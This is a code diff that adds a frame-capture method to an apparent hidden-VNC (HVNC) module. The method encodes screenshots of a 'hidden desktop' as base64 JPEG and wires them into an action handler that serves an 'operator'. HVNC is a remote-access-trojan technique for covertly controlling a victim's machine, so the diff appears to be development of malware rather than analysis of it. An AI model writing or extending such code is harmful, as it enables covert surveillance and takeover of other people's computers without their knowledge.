@@ -524,6 +524,68 @@ class HVNCActions:
             "processes": processes
         }
     
+    def get_frame(self, quality: int = 50, scale: float = 0.5) -> dict:
+        """Get a frame from the hidden desktop as base64 JPEG.
+        
+        Args:
+            quality: JPEG quality (1-100)
+            scale: Scale factor for the image (0.1-1.0)
+            
+        Returns:
+            Response dict with base64 encoded JPEG frame
+        """
+        if not self.is_active:
+            return {"action": "hvnc_get_frame", "success": False, "error": "HVNC not active"}
+        
+        try:
+            import base64
+            import io
+            
+            # Get raw frame from session
+            frame_data, size = self._session.get_frame(timeout=0.5)
+            
+            if not frame_data or not size:
+                return {"action": "hvnc_get_frame", "success": False, "error": "No frame available"}
+            
+            width, height = size
+            
+            # Convert BGRA to RGB and create image
+            try:
+                from PIL import Image
+                
+                # Frame data is BGRA
+                img = Image.frombytes("RGBA", (width, height), frame_data, "raw", "BGRA")
+                img = img.convert("RGB")
+                
+                # Scale if needed
+                if scale < 1.0:
+                    new_width = int(width * scale)
+                    new_height = int(height * scale)
+                    img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
+                
+                # Save as JPEG to buffer
+                buffer = io.BytesIO()
+                img.save(buffer, format="JPEG", quality=quality)
+                jpeg_data = buffer.getvalue()
+                
+                # Encode to base64
+                b64_frame = base64.b64encode(jpeg_data).decode("ascii")
+                
+                return {
+                    "action": "hvnc_get_frame",
+                    "success": True,
+                    "frame": b64_frame,
+                    "width": img.width,
+                    "height": img.height,
+                }
+            except ImportError:
+                # PIL not available, return error
+                return {"action": "hvnc_get_frame", "success": False, "error": "PIL not installed"}
+                
+        except Exception as exc:
+            logger.error("Failed to get HVNC frame: %s", exc)
+            return {"action": "hvnc_get_frame", "success": False, "error": str(exc)}
+    
     def handle_action(self, action: str, payload: dict) -> dict:
         """Handle HVNC action from operator.
         
@@ -560,6 +622,10 @@ class HVNCActions:
                 payload.get("name")
             ),
             "list_processes": lambda: self.list_processes(),
+            "get_frame": lambda: self.get_frame(
+                payload.get("quality", 50),
+                payload.get("scale", 0.5)
+            ),
         }
         
         handler = handlers.get(action)
